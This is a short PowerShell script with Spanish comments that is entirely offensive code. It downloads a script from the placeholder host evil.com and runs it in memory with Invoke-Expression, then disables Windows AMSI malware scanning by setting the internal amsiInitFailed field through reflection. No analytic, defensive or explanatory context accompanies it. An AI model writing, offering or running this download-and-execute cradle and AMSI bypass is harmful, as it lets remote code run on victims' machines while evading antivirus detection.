# Script limpio y legible
$url = "http://evil.com/payload.ps1"
$webClient = New-Object Net.WebClient
$scriptContent = $webClient.DownloadString($url)
Invoke-Expression $scriptContent

# Bypass AMSI simple
$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsiInitFailed = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
$amsiInitFailed.SetValue($null, $true)